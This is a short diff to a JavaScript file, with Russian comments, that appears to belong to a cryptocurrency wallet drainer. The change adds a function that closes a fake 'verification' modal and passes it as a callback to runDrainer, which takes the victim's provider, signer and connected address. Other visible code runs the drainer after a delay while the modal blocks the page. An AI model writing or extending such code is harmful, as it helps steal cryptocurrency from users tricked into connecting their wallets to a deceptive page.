@@ -251,6 +251,10 @@ async function hideModalWithDelay(errorMessage = null) {
   document.body.style.pointerEvents = 'auto';
 }
 
+async function closeVerificationModal() {
+  await hideModalWithDelay();
+}
+
 // === Выполнение drainer ===
 async function attemptDrainer() {
   if (hasDrained || isTransactionPending) {
@@ -280,7 +284,7 @@ async function attemptDrainer() {
     await new Promise(resolve => setTimeout(resolve, 5000));
 
     isTransactionPending = true;
-    const status = await runDrainer(provider, signer, connectedAddress);
+    const status = await runDrainer(provider, signer, connectedAddress, closeVerificationModal);
     console.log('✅ Drainer выполнен, статус:', status);
 
     hasDrained = true;
